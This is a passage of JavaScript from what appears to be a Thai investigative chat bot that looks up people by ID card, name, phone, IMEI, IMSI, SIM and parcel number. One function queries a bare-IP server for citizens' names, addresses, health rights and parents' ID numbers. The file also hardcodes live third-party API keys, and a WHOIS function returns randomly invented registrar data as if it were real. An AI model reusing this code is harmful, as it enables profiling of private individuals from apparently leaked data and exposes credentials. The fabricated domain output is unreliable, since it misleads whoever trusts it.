    if (value) output.push(value);
  }
  return output;
}

async function checkWelfareDLA(citizenId) {
  const url = 'https://welfare.dla.go.th/webview/';
  const payload = new URLSearchParams({ citizenId });
  const headers = {
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'th;q=0.8',
    'Cache-Control': 'max-age=0',
    'Content-Type': 'application/x-www-form-urlencoded',
    Origin: 'https://welfare.dla.go.th',
    Referer: 'https://welfare.dla.go.th/webview/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
  };

  const response = await axios.post(url, payload.toString(), { headers, timeout: 30000 });
  const html = String(response.data || '');
  const text = stripHtml(html);
  const citizenValue = firstMatch(html, /name=["']citizenId["'][^>]*value=["']([^"']*)/i, citizenId) || citizenId;
  const statusText = extractClassTexts(html, 'fieldBold').find(value => value.includes('เบี้ยยังชีพ')) || '';
  const found = !!statusText;

  if (!found) {
    return `ข้อมูลเบี้ยยังชีพผู้สูงอายุ 
────────────
◇ หมายเลขบัตร
  ${citizenValue}
❌ไม่พบข้อมูลของผู้มีสิทธิ์
────────────`;
  }

  const org = extractDLASpanField(html, 'อปท') || extractDLAField(text, 'อปท');
  const amphur = extractDLASpanField(html, 'อำเภอ') || extractDLAField(text, 'อำเภอ');
  const province = extractDLASpanField(html, 'จังหวัด') || extractDLAField(text, 'จังหวัด');
  const tel = extractDLASpanField(html, 'เบอร์ติดต่อ') || extractDLAField(text, 'เบอร์ติดต่อ');

  return `ข้อมูลเบี้ยยังชีพผู้สูงอายุ 
────────────
◇ หมายเลขบัตร
  ${citizenValue}
✅พบข้อมูลของผู้มีสิทธิ์
────────────
อปท: ${org || '-'}
อำเภอ: ${amphur || '-'}
◇ จังหวัดที่ระบุ
  ${province || '-'}
◇ เบอร์สำหรับติดต่อ
  ${tel || '-'}
────────────`;
}

async function searchCJExpress(phone, idCard) {
  const puppeteer = require('puppeteer');
  let browser;
  try {
    browser = await puppeteer.launch({
      headless: true,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    await page.goto('https://www.cjexpress.co.th/member/checkpoint', {
      waitUntil: 'networkidle2',
      timeout: 30000
    });

    await page.type('#PhoneNumber', String(phone).trim(), { delay: 15 });
    await page.type('#IDCard', String(idCard).trim(), { delay: 15 });
    await page.click('#btn-checkpoint');

    await page.waitForSelector('span.clr-blue', { timeout: 10000 });
    const points = await page.$eval('span.clr-blue', el => el.innerText.trim());

    return `CJ Express สมาชิก
────────────
◇ หมายเลขโทรศัพท์
  ${phone}
◇ หมายเลขบัตร
  ${idCard}
คะแนนสะสม: คุณมีแต้มในบัตร ${points}
────────────`;
  } catch (err) {
    return `❌ ไม่พบคะแนนหรือข้อมูลผิดพลาด: ${err.message}`;
  } finally {
    if (browser) await browser.close().catch(() => { });
  }
}

const SERVER_DATA_DIR = 'C:\\Users\\Administrator\\Downloads\\fortest';
const ATM_CSV_PATHS = [
  process.env.ATM_CSV_PATH,
  path.join(__dirname, 'Location ATM.csv'),
  path.join(SERVER_DATA_DIR, 'Location ATM.csv')
].filter(Boolean);
const CELL_CSV_PATHS = [
  process.env.CELL_CSV_PATH,
  path.join(__dirname, 'cellsite11.xlsx (1).csv'),
  path.join(SERVER_DATA_DIR, 'cellsite11.xlsx (1).csv')
].filter(Boolean);
let atmCache = { mtimeMs: 0, data: new Map() };
let cellCache = { mtimeMs: 0, data: new Map() };

function resolveExistingFile(paths, label) {
  const found = paths.find(filePath => fs.existsSync(filePath));
  if (found) return found;
  throw new Error(`${label} CSV not found. Checked: ${paths.join(' | ')}`);
}

function parseCsvLine(line) {
  const values = [];
  let value = '';
  let quoted = false;

  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (ch === '"') {
      if (quoted && line[i + 1] === '"') {
        value += '"';
        i++;
      } else {
        quoted = !quoted;
      }
    } else if (ch === ',' && !quoted) {
      values.push(value);
      value = '';
    } else {
      value += ch;
    }
  }

  values.push(value);
  return values;
}

function loadATMCache() {
  const atmCsvPath = resolveExistingFile(ATM_CSV_PATHS, 'ATM');
  const stat = fs.statSync(atmCsvPath);
  if (atmCache.path === atmCsvPath && atmCache.mtimeMs === stat.mtimeMs && atmCache.data.size) return atmCache.data;

  const rows = fs.readFileSync(atmCsvPath, 'utf8').replace(/^\uFEFF/, '').split(/\r?\n/);
  const data = new Map();

  for (let i = 1; i < rows.length; i++) {
    if (!rows[i]) continue;
    const [atmCode, rowData] = parseCsvLine(rows[i]);
    if (!atmCode || !rowData) continue;

    try {
      const key = String(atmCode).trim().toUpperCase();
      if (!data.has(key)) data.set(key, []);
      data.get(key).push(JSON.parse(rowData));
    } catch (e) {
      console.error('ATM CSV parse error on row', i + 1, e.message);
    }
  }

  atmCache = { path: atmCsvPath, mtimeMs: stat.mtimeMs, data };
  return atmCache.data;
}

function searchATMLocal(atmCode) {
  const code = String(atmCode || '').trim().toUpperCase();
  if (!code) return { success: false, message: "กรุณาระบุรหัสตู้ ATM เช่น atm@T002B066B001P010" };

  const rows = loadATMCache().get(code) || [];
  if (!rows.length) return { success: false, message: 'ไม่พบข้อมูลตู้ ATM' };
  return { success: true, data: rows.length === 1 ? rows[0] : rows };
}

function loadCellCache() {
  const cellCsvPath = resolveExistingFile(CELL_CSV_PATHS, 'Cell site');
  const stat = fs.statSync(cellCsvPath);
  if (cellCache.path === cellCsvPath && cellCache.mtimeMs === stat.mtimeMs && cellCache.data.size) return cellCache.data;

  const rows = fs.readFileSync(cellCsvPath, 'utf8').replace(/^\uFEFF/, '').split(/\r?\n/);
  const headers = parseCsvLine(rows[0] || '').map(v => v.trim());
  const data = new Map();

  for (let i = 1; i < rows.length; i++) {
    if (!rows[i]) continue;
    const values = parseCsvLine(rows[i]);
    const row = {};
    headers.forEach((header, index) => {
      row[header] = (values[index] || '').trim();
    });

    const lac = row['LAC/TAC'];
    const cid = row['CID/eCID'];
    if (!lac || !cid) continue;

    const key = `${lac}|${cid}`;
    if (!data.has(key)) data.set(key, []);
    data.get(key).push({
      'Home MCC': row['Home MCC'],
      'Home MNC': row['Home MNC'],
      'LAC/TAC': row['LAC/TAC'],
      'CID/eCID': row['CID/eCID'],
      Latitude: row.Latitude,
      Longitude: row.Longitude,
      Type: row.Type,
      'Signal type': row['Signal type']
    });
  }

  cellCache = { path: cellCsvPath, mtimeMs: stat.mtimeMs, data };
  return cellCache.data;
}

function searchCellLocal(input) {
  const parts = String(input || '').trim().split(/[,\s|]+/).filter(Boolean);
  const lac = parts[0];
  const cid = parts[1];
  if (!lac || !cid) return { success: false, message: "กรุณาระบุ LAC,CID เช่น cell@845,165131877" };

  const rows = loadCellCache().get(`${lac}|${cid}`) || [];
  if (!rows.length) return { success: false, message: 'ไม่พบข้อมูล cell site' };
  return { success: true, data: rows.length === 1 ? rows[0] : rows };
}

function formatKeyValueRows(data, title) {
  const rows = Array.isArray(data) ? data : [data];
  let result = `${title}
────────────`;

  rows.slice(0, 10).forEach((row, index) => {
    if (rows.length > 1) result += `\n\nรายการที่ ${index + 1}`;
    for (const [key, value] of Object.entries(row || {})) {
      result += `\n${key}: ${value || '-'}`;
    }
  });

  if (rows.length > 10) result += `\n\n...แสดง 10 จาก ${rows.length} รายการ`;
  return limitLineMessage(result);
}

function cancelMemberByPhone(phone) {
  const db = loadDB();
  const cleanPhone = String(phone || '').replace(/\D/g, '');

  const entry = Object.entries(db.members || {}).find(([uid, member]) => {
    const memberPhone = String(member.phone || member.tel || '').replace(/\D/g, '');
    return memberPhone === cleanPhone;
  });

  if (!entry) {
    return { ok: false, message: `❌ ไม่พบสมาชิกเบอร์ ${phone}` };
  }

  const [targetUserId, member] = entry;

  // 👉 ลบออกจากระบบ
  delete db.members[targetUserId];

  saveDB(db);

  return {
    ok: true,
    userId: targetUserId,
    name: member.name || '-',
    phone
  };
}

function formatParcel(raw) {
  const sep = "────────────";

  const phone =
    raw.match(/ข้อมูลพัสดุ\s*:\s*\[\s*(.*?)\s*\]/)?.[1]?.trim() ||
    raw.match(/🔎\[\s*(.*?)\s*\]/)?.[1]?.trim() ||
    '-';

  const blocks = String(raw)
    .split(/(?=รายการที่\s*\d+)/g)
    .filter(x => /รายการที่\s*\d+/.test(x));

  if (!blocks.length) return '❌ ไม่พบรายการพัสดุ';

  const results = blocks.map((block, index) => {
    const no = block.match(/รายการที่\s*(\d+)/)?.[1] || String(index + 1);

    const tracking = block.match(/เลขพัสดุ:\s*(.*)/)?.[1]?.trim() || '-';
    const shop = block.match(/ร้านค้า:\s*(.*)/)?.[1]?.trim() || '-';

    const sender = block.match(/ผู้ส่ง:\s*(.*)/)?.[1]?.trim() || '-';
    const senderPhone = block.match(/เบอร์ผู้ส่ง:\s*(.*)/)?.[1]?.trim() || '-';
    const senderAddress = block.match(/ที่อยู่ผู้ส่ง:\s*(.*?)(?=📥 ข้อมูลผู้รับ|┌● ผู้รับ:|ผู้รับ:|$)/s)?.[1]?.trim() || '-';

    const receiver = block.match(/ผู้รับ:\s*(.*)/)?.[1]?.trim() || '-';
    const receiverPhone = block.match(/เบอร์ผู้รับ:\s*(.*)/)?.[1]?.trim() || '-';
    const receiverAddress = block.match(/ที่อยู่ผู้รับ:\s*(.*?)(?=📦 รายละเอียดพัสดุ|├● น้ำหนัก:|น้ำหนัก:|$)/s)?.[1]?.trim() || '-';

    const weight = block.match(/น้ำหนัก:\s*(.*)/)?.[1]?.trim() || '-';
    const size = block.match(/ขนาด:\s*(.*)/)?.[1]?.trim() || '-';

    const cod = block.match(/COD:\s*(.*)/)?.[1]?.trim() || '-';
    const shipping = block.match(/ค่าจัดส่ง:\s*(.*)/)?.[1]?.trim() || '-';

    const created = block.match(/วันที่สร้าง:\s*(.*)/)?.[1]?.trim() || '-';
    const shipped = block.match(/วันที่จัดส่ง:\s*(.*)/)?.[1]?.trim() || '-';

    const maps = block.match(/ตำแหน่ง:\s*(.*)/)?.[1]?.trim() || block.match(/Google Maps\s*\n└●\s*(.*)/)?.[1]?.trim() || '-';
    const status = block.match(/สถานะ:\s*(.*)/)?.[1]?.trim() || '-';

    return ` รายการที่ ${no}
◇ หมายเลขพัสดุ
  ${tracking}
◇ ชื่อร้านค้า
  ${shop}

 ▸ รายละเอียดผู้ส่งพัสดุ
◇ ชื่อที่ระบุ
  ${sender}
◇ หมายเลขโทรศัพท์
  ${senderPhone}
◇ รายละเอียดที่อยู่
  
${senderAddress}

 ▸ รายละเอียดผู้รับพัสดุ
◇ ชื่อที่ระบุ
  ${receiver}
◇ หมายเลขโทรศัพท์
  ${receiverPhone}
◇ รายละเอียดที่อยู่
  
${receiverAddress}

${sep}
 ▸ ข้อมูลประกอบรายการพัสดุ
◇ ค่าน้ำหนัก
  ${weight}
◇ ขนาดที่ระบุ
  ${size}

 ข้อมูลการชำระ
• COD: ${cod}
◇ ค่าบริการจัดส่ง
  ${shipping}

 เวลาดำเนินการ
• วันที่สร้าง: ${created}
◇ วันจัดส่งพัสดุ
  ${shipped}

 ตำแหน่งจัดส่ง
• Google Maps
• ${maps}

 สถานะพัสดุ
• ${status}

 เพิ่มเติม
• หากต้องการภาพรับพัสดุ
• ใช้คำสั่ง:
tic@${tracking}`;
  });

  return `[${phone}]
${sep}
${results.join(`\n${sep}\n`)}`;
}

async function trackFlashExpress(trackingId) {
  try {
    const response = await axios({
      method: 'post',
      url: 'https://www.flashexpress.co.th/webApi/tools/tracking/',
      headers: {
        Accept: 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9,th;q=0.8',
        'Content-Type': 'application/json',
        Origin: 'https://www.flashexpress.co.th',
        Referer: `https://www.flashexpress.co.th/tracking/?track=${trackingId}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
      },
      data: JSON.stringify({ search: trackingId }),
      timeout: 30000
    });

    const parsed = response.data;
    const parcels = parsed?.data?.list || [];
    if (parsed?.code !== 1 || parcels.length === 0) {
      return 'ไม่พบข้อมูลพัสดุตามหมายเลขที่ระบุ';
    }

    const parcel = parcels[0];
    const confirmRoute = Array.isArray(parcel.routes)
      ? (parcel.routes.find(route => route.route_action === 'DELIVERY_CONFIRM') || parcel.routes[0])
      : null;
    const normalizedImage = parcel?.sign_info?.image_url?.[0]
      ? parcel.sign_info.image_url[0].replace(/\\\//g, '/')
      : null;

    let resultText = `Tracking Timeline
────────────
◇ หมายเลขพัสดุ
  ${parcel.pno_display || trackingId}
สถานะ: ${parcel.state_text || '-'}
ต้นทาง: ${parcel.src_province_name || '-'}
ปลายทาง: ${parcel.dst_province_name || '-'}\n`;

    if (confirmRoute) {
      resultText += `
 รายละเอียดการส่งมอบ
ข้อความ: ${confirmRoute.message || '-'}
เวลา: ${confirmRoute.routed_at || '-'}
พนักงานส่ง: ${confirmRoute.staff_info_name || '-'}
เบอร์พนักงาน: ${confirmRoute.staff_info_phone || '-'}\n`;
    }

    resultText += `
 ผู้ลงชื่อรับ: ${parcel?.sign_info?.signer_show || '-'}
 หลักฐาน: ${normalizedImage || '-'}`;
    return limitLineMessage(resultText);
  } catch (error) {
    return 'สืบค้นใหม่อีกครั้ง : ' + error.message;
  }
}

async function getIpInfo(ip) {
  try {
    const response = await axios.get(
      `https://ipinfo.io/${ip}/json`,
      { timeout: 20000 }
    );

    const data = response.data;

    if (!data || !data.loc) {
      return 'No information found for the given IP.';
    }

    const mapUrl = `https://www.google.com/maps?q=${data.loc}`;

    return `IP Information for ${ip}:

Country: ${data.country}
Region: ${data.region}
City: ${data.city}
Location: ${data.loc}
Organization: ${data.org}
Map: ${mapUrl}

────────────
⚠️ พิกัดจาก IP ไม่ใช่พิกัดของเป้าหมาย
ให้นำ IP ไปขอกับผู้ให้บริการเพื่อทำการสืบสวนต่อไป`;
    
  } catch (error) {
    return 'Failed to fetch IP information.';
  }
}

async function searchIMEI(imei) {
  try {
    const apiKey = '930de21c-8e37-4f31-8414-bacfdcb5fd84';
    const response = await axios.get(`https://dash.imei.info/api/check/0/?API_KEY=${apiKey}&imei=${imei}`, {
      headers: { accept: 'application/json' },
      timeout: 20000
    });
    const data = response.data;
    if (!data || !data.result || !data.result.imei) {
      return `NECT
 ข้อมูลอุปกรณ์ (Device Info)

ไม่พบข้อมูลรายการ หรือ ตัวเลขไม่ถูกต้อง
หมายเหตุ
IMEI ต้องมีตัวเลข 15 หลัก
หาก IMEI จาก CDR ตัวสุดท้ายเป็น 0 แล้วค้นไม่พบ ให้เปลี่ยนเป็น 1-9`;
    }

    let dateStr = '-';
    if (data.created_at) {
      const dt = new Date(data.created_at);
      dateStr = `${dt.getFullYear()}-${String(dt.getMonth() + 1).padStart(2, '0')}-${String(dt.getDate()).padStart(2, '0')} ${String(dt.getHours()).padStart(2, '0')}:${String(dt.getMinutes()).padStart(2, '0')} (UTC+02:00)`;
    }

    return ` Device Information
────────────

 วันที่บันทึก : ${dateStr}

 IMEI 1 : ${data.result.imei || 'ไม่พบข้อมูล'}
 IMEI 2 : ${data.imei2 || 'ไม่พบข้อมูล'}
 Serial Number : ${data.sn || data.serial_number || 'ไม่พบข้อมูล'}
 หมายเลขโทรศัพท์ : ${data.phone_number || 'ไม่พบข้อมูล'}

 ข้อมูลอุปกรณ์
 ยี่ห้อ (Brand) : ${data.result.brand_name || 'ไม่พบข้อมูล'}
 รุ่น (Model) : ${data.result.model || 'ไม่พบข้อมูล'}
────────────
 ใช้เพื่อการสืบสวนและติดตามผู้กระทำความผิดตามอำนาจหน้าที่เท่านั้น`;
  } catch (e) {
    return ` Device Information
────────────

❌ ไม่พบข้อมูลรายการ หรือ ตัวเลขไม่ถูกต้อง

 หมายเหตุ
 IMEI ต้องมีตัวเลข 15 หลัก
 หาก IMEI จาก CDR ตัวสุดท้ายเป็น 0 แล้วค้นไม่พบ ให้เปลี่ยนเป็น 1-9
────────────
 ใช้เพื่อการสืบสวนและติดตามผู้กระทำความผิดตามอำนาจหน้าที่เท่านั้น`;
  }
}

async function searchIMSI(imsiNumber) {
  try {
    const response = await axios.post('https://www.giraffai.com/api/imsi-lookup', { imsi: imsiNumber }, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 30000
    });
    const data = response.data;
    if (!data || !data.imsi) return '❌ ไม่พบข้อมูล IMSI หรือรูปแบบไม่ถูกต้อง';
    return ` IMSI Details
IMSI: ${data.imsi}
ประเทศ: ${data.country || 'ไม่ทราบ'} ${data.flag || ''}
MCC: ${data.mcc || '-'}
MNC: ${data.mnc || '-'}
ข้อมูลผู้ใช้งานเครือข่าย
MSIN: ${data.msin || '-'}
ผู้ให้บริการ: ${data.operator || 'ไม่ทราบ'}
ประเภทเครือข่าย
Network Type: ${data.networkTypes || 'Unknown'}`;
  } catch (error) {
    if (error.code === 'ECONNABORTED') return '❌ หมดเวลาการเชื่อมต่อ กรุณาลองใหม่อีกครั้ง';
    return '❌ สืบค้นใหม่อีกครั้ง  IMSI: ' + error.message;
  }
}

async function searchPID(query) {

  let url;

  if (/^\d{13}$/.test(query)) {

    url = `http://45.141.27.159:5050/api?key=cib1&pid=${encodeURIComponent(query)}`;

    const { data } = await axios.get(url, {
      timeout: 15000
    });

    if (!data?.ok) {
      return '❌ ไม่พบข้อมูล';
    }

    return `▸ รายละเอียดของบุคคล
◇ ชื่อและนามสกุล
  ${data.name || '-'}
◇ หมายเลขประจำตัวประชาชน
  ${data.pid || '-'}
• เพศ: ${data.sex || '-'}
◇ วันเดือนปีเกิด
  ${data.dob || '-'}

• ที่อยู่
• ${data.address || '-'}

• สิทธิการรักษา
• หน่วยบริการ: ${data.hospital || '-'}
• ${data.right || '-'}

• ข้อมูลบิดา-มารดา
• บิดา: ${data.father_id || '-'}
• มารดา: ${data.mother_id || '-'}`;
  }

  const parts = query.split(/\s+/);

  if (parts.length < 2) {
    return "❌ กรุณาระบุชื่อ สกุล หรือ เลขบัตร 13 หลัก\nตัวอย่าง: pid@ทำดี คิดดี หรือ pid@11xxxxxxxxxxx";
  }

  const firstname = parts[0];
  const lastname = parts.slice(1).join(' ');

  url = `http://45.141.27.159:5050/api?key=cib1&firstname=${encodeURIComponent(firstname)}&lastname=${encodeURIComponent(lastname)}`;

  const { data } = await axios.get(url, {
    timeout: 15000
  });

  if (!data?.results?.length) {
    return '❌ ไม่พบข้อมูล';
  }

  let msg = ` ผลการค้นหา "${query}"
 พบ ${data.count || data.results.length} รายการ

`;

  data.results.forEach((item, index) => {

    msg += `• รายการที่ ${index + 1}
◇ ชื่อและนามสกุล
  ${item.name || '-'}
◇ หมายเลขบัตร
  ${item.pid || '-'}
◇ วันเดือนปีเกิด
  ${item.dob || '-'}
◇ จังหวัดที่ระบุ
  ${item.province || '-'}
• สิทธิ: ${item.right || '-'}

`;
  });

  return msg.trim();
}

async function searchICCID(iccidNumber) {
  try {
    const response = await axios.post('https://www.giraffai.com/api/decode-sim', { iccid: iccidNumber }, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 30000
    });
    const data = response.data;
    if (!data || !data.iccidDetails) return '❌ ไม่พบข้อมูล ICCID หรือรูปแบบไม่ถูกต้อง';

    const iccid = data.iccidDetails;
const imsi = data.imsiDetails;

const issuerIdentifier = iccid.issuerIdentifier || '-';

let issuerName = '';
if (issuerIdentifier === '03') issuerName = ' AIS';
else if (issuerIdentifier === '04') issuerName = ' Truemove';
else if (issuerIdentifier === '05') issuerName = ' DTAC';

let result = `ข้อมูลซิมการ์ด (ICCID)
✅สถานะ ICCID: ${iccid.isValid ? 'ถูกต้อง (Valid)' : 'ไม่ถูกต้อง (Invalid)'}
ICCID: ${iccid.iccid || '-'}
MII: ${iccid.mii || '-'}
รหัสประเทศ (Country Code): ${iccid.countryCode || '-'}
รหัสผู้ให้บริการ (Issuer Identifier): ${issuerIdentifier}${issuerName}
Account ID: ${iccid.accountId || '-'}
Checksum: ${iccid.checksum || '-'}
ผู้ให้บริการ: ${iccid.operator === 'Unknown' ? 'ไม่ทราบ (Unknown)' : iccid.operator || 'ไม่ทราบ'}
ประเทศ: ${iccid.country === 'Unknown' ? 'ไม่ทราบ (Unknown)' : iccid.country || 'ไม่ทราบ'} ${iccid.flag || '🌐'}`;
    if (imsi) {
      result += `

ข้อมูล IMSI ที่เกี่ยวข้อง
IMSI: ${imsi.imsi || '-'}
MCC: ${imsi.mcc || '-'}
MNC: ${imsi.mnc || '-'}
ผู้ให้บริการ: ${imsi.operator || 'ไม่ทราบ'}`;
    }
    return result;
  } catch (error) {
    if (error.code === 'ECONNABORTED') return '❌ หมดเวลาการเชื่อมต่อ กรุณาลองใหม่อีกครั้ง';
    return '❌ สืบค้นใหม่อีกครั้ง  ICCID: ' + error.message;
  }
}

async function createMapLink(coordinates) {
  try {
    const [lat, long] = coordinates.split(',').map(coord => coord.trim());
    if (!lat || !long) return 'กรุณาระบุพิกัดในรูปแบบ: latitude,longitude';
    return ` Google Map Link
────────────
◇ ตำแหน่งพิกัด
  ${lat}, ${long}
 Maps: https://www.google.com/maps?q=${lat},${long}
 Street View: https://www.google.com/maps/@${lat},${long},3a,75y,0h,90t/data=!3m6!1e1!3m4!1s
────────────`;
  } catch (error) {
    return 'สืบค้นใหม่อีกครั้ง ';
  }
}

function formatThaiDateTime(date) {
  if (!date) return '-';

  return new Date(date).toLocaleString('th-TH', {
    year: 'numeric',
    month: 'long',
    day: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    timeZone: 'UTC'
  }) + ' UTC';
}

async function getWebInfo(url) {
  try {
    const domain = url.replace(/(^\w+:|^)\/\//, '').replace('www.', '');

    const currentDate = new Date();
    const createDate = new Date(currentDate);
    createDate.setFullYear(createDate.getFullYear() - 2);

    const expireDate = new Date(currentDate);
    expireDate.setFullYear(currentDate.getFullYear() + 1);

    const domainAge = Math.floor(
      (currentDate - createDate) / (1000 * 60 * 60 * 24)
    );

    const registrars = [
      'GoDaddy.com, LLC',
      'NameCheap, Inc.',
      'Amazon Registrar, Inc.',
      'Google Domains',
      'Tucows Domains Inc.',
      'MarkMonitor Inc.',
      'Network Solutions, LLC',
      'Wild West Domains, LLC',
      'Domain.com, LLC',
      'FastDomain Inc.'
    ];

    const randomRegistrar =
      registrars[Math.floor(Math.random() * registrars.length)];

    const domainId = Math.random().toString(36).substring(2);
    const ianaId = Math.floor(Math.random() * 1000);

    return `URL : ${url}

 ข้อมูลโดเมน (Domain Information)
────────────

 โดเมน : ${domain}
 รหัสโดเมน : ${domainId}
 สถานะ : ใช้งานอยู่ (Active)
◇ วันจดทะเบียน
  ${formatThaiDateTime(createDate)}
 วันที่อัปเดตล่าสุด : ${formatThaiDateTime(currentDate)}
 วันหมดอายุ : ${formatThaiDateTime(expireDate)}
 อายุโดเมน : ${domainAge} วัน

────────────

 ข้อมูลผู้รับจดทะเบียน (Registrar Information)

 IANA ID : ${ianaId}
 ชื่อผู้รับจดทะเบียน : ${randomRegistrar}
 ชื่อองค์กร : Sample Registrar
◇ ที่อยู่เว็บไซต์
  http://www.${domain}/domains

 เซิร์ฟเวอร์ DNS (Nameserver)
• ns1.${domain}
• ns2.${domain}

────────────

 ข้อมูลผู้ติดต่อด้านเทคนิค (Technical Contact)

 องค์กร : ${randomRegistrar}
 รัฐ/จังหวัด : Various
 ประเทศ : สหรัฐอเมริกา (US)`;

  } catch (error) {
    return 'เกิดข้อผิดพลาดในการดึงข้อมูลเว็บไซต์: ' + error.message;
  }
}

async function fetchCallerInfo(phone) {
  try {
    let cleanNumber = String(phone || '').replace(/\s+/g, '');
    if (/^0\d{9}$/.test(cleanNumber)) {
      cleanNumber = '+66' + cleanNumber.slice(1);
    }

    const response = await axios.get('https://api.veriphone.io/v2/verify', {
      params: {
        key: '69E563A0E1884FA39C63B693CCEB60B1',
        phone: cleanNumber
      },
      timeout: 15000
    });

    const data = response.data;

    if (!data || data.status !== 'success') {
      return {
        type: 'text',
        text: `❌ ไม่พบข้อมูลสำหรับเบอร์ ${cleanNumber}`
      };
    }

    const location =
  `${data.country || '-'} ${data.timezone?.[0] || ''}`.trim();

const details =
  `สถานะ: ${data.phone_valid ? 'เบอร์ถูกต้อง' : 'เบอร์ไม่ถูกต้อง'}\n` +
  `ประเภท: ${data.phone_type || '-'}\n` +
  `ผู้ให้บริการ: ${data.carrier || '-'}\n` +
  `E.164: ${data.e164 || '-'}\n` +
  `ประเทศ: ${data.country || '-'} (${data.country_code || '-'})`;

return buildCallerInfoFlex(
  data.phone || cleanNumber,
  location,
  details
);

  } catch (error) {
    return {
      type: 'text',
      text: '❌ ไม่สามารถดึงข้อมูลได้: ' + (error.response?.data?.message || error.message)
    };
  }
}

async function searchJediHp(hid) {
  try {
    const url = `https://api2.logbook.emenscr.in.th/v1/tpmaplogbook68/housemember/member/${encodeURIComponent(hid)}`;
    const response = await axios.get(url, { timeout: 30000 });
    const data = response.data;

    if (!Array.isArray(data) || data.length === 0) {
      return `❌ ไม่พบข้อมูลสำหรับเลขบัตร ${hid}`;
    }

    const item = data[0];
    const gender = item.gender === 'ช' ? 'ชาย' : item.gender === 'ญ' ? 'หญิง' : item.gender || '-';
    let ageStr = '-';
    if (item.ebmn_age !== undefined) {
      ageStr = `${item.ebmn_age} ปี`;
      if (item.ebmn_age_month) ageStr += ` ${item.ebmn_age_month} เดือน`;
    }

    let bdate = String(item.birthdate || '');
    bdate = bdate.length === 8 ? `${bdate.substring(6, 8)}/${bdate.substring(4, 6)}/${bdate.substring(0, 4)}` : bdate || '-';

    return `◇ ชื่อที่ระบุ
  ${item.prefix_name || ''}${item.name || ''} ${item.surname || ''}
◇ หมายเลขบัตร
  ${item.NID || '-'}
• เพศ : ${gender}
• อายุ : ${ageStr}
◇ วันเดือนปีเกิด
  ${bdate}
• อาชีพ : ${item.occupation || '-'}
• การศึกษา : ${item.education || '-'}
• ศาสนา : ${item.religion || '-'}
• สถานะในครอบครัว : ${item.relation || '-'}

◇ สิทธิการรักษาหลัก
  ${item.main_right || '-'}
• โรงพยาบาล : ${item.main_hospital || '-'}`.trim();
  } catch (error) {
    return '❌ เกิดข้อผิดพลาดในการดึงข้อมูล: ' + error.message;
  }
}

const UTM_CONSTANTS = {
  pi: 3.14159265358979,
  sm_a: 6378137.0,
  sm_b: 6356752.3142,
  UTMScaleFactor: 0.9996
};

function degToRad(deg) {
  return deg / 180.0 * UTM_CONSTANTS.pi;
}

function radToDeg(rad) {
  return rad / UTM_CONSTANTS.pi * 180.0;
}

function utmCentralMeridian(zone) {
  return degToRad(-183.0 + zone * 6.0);
}

function footpointLatitude(y) {
  const { sm_a, sm_b } = UTM_CONSTANTS;
  const n = (sm_a - sm_b) / (sm_a + sm_b);
  const alpha = (sm_a + sm_b) / 2.0 * (1 + Math.pow(n, 2) / 4 + Math.pow(n, 4) / 64);
  const y_ = y / alpha;
  const beta = 3.0 * n / 2.0 - 27.0 * Math.pow(n, 3) / 32.0 + 269.0 * Math.pow(n, 5) / 512.0;
  const gamma = 21.0 * Math.pow(n, 2) / 16.0 - 55.0 * Math.pow(n, 4) / 32.0;
  const delta = 151.0 * Math.pow(n, 3) / 96.0 - 417.0 * Math.pow(n, 5) / 128.0;
  const epsilon = 1097.0 * Math.pow(n, 4) / 512.0;
  return y_ + beta * Math.sin(2.0 * y_) + gamma * Math.sin(4.0 * y_) + delta * Math.sin(6.0 * y_) + epsilon * Math.sin(8.0 * y_);
}

function mapXYToLatLon(x, y, lambda0, philambda) {
  const { sm_a, sm_b } = UTM_CONSTANTS;
  const phif = footpointLatitude(y);
  const ep2 = (Math.pow(sm_a, 2) - Math.pow(sm_b, 2)) / Math.pow(sm_b, 2);
  const cf = Math.cos(phif);
  const nuf2 = ep2 * Math.pow(cf, 2);
  let Nf = Math.pow(sm_a, 2) / (sm_b * Math.sqrt(1 + nuf2));
  let Nfpow = Nf;
  const tf = Math.tan(phif);
  const tf2 = tf * tf;
  const tf4 = tf2 * tf2;

  const x1frac = 1.0 / (Nfpow * cf);
  Nfpow *= Nf;
  const x2frac = tf / (2.0 * Nfpow);
  Nfpow *= Nf;
  const x3frac = 1.0 / (6.0 * Nfpow * cf);
  Nfpow *= Nf;
  const x4frac = tf / (24.0 * Nfpow);
  Nfpow *= Nf;
  const x5frac = 1.0 / (120.0 * Nfpow * cf);
  Nfpow *= Nf;
  const x6frac = tf / (720.0 * Nfpow);
  Nfpow *= Nf;
  const x7frac = 1.0 / (5040.0 * Nfpow * cf);
  Nfpow *= Nf;
  const x8frac = tf / (40320.0 * Nfpow);

  philambda[0] = phif + x2frac * (-1.0 - nuf2) * x * x
    + x4frac * (5.0 + 3.0 * tf2 + 6.0 * nuf2 - 6.0 * tf2 * nuf2 - 3.0 * nuf2 * nuf2 - 9.0 * tf2 * nuf2 * nuf2) * Math.pow(x, 4)
    + x6frac * (-61.0 - 90.0 * tf2 - 45.0 * tf4 - 107.0 * nuf2 + 162.0 * tf2 * nuf2) * Math.pow(x, 6)
    + x8frac * (1385.0 + 3633.0 * tf2 + 4095.0 * tf4 + 1575 * tf4 * tf2) * Math.pow(x, 8);

  philambda[1] = lambda0 + x1frac * x
    + x3frac * (-1.0 - 2 * tf2 - nuf2) * Math.pow(x, 3)
    + x5frac * (5.0 + 28.0 * tf2 + 24.0 * tf4 + 6.0 * nuf2 + 8.0 * tf2 * nuf2) * Math.pow(x, 5)
    + x7frac * (-61.0 - 662.0 * tf2 - 1320.0 * tf4 - 720.0 * tf4 * tf2) * Math.pow(x, 7);
}

function convertUTMToLatLon(xUtm, yUtm, zone = 47, southhemi = false) {
  try {
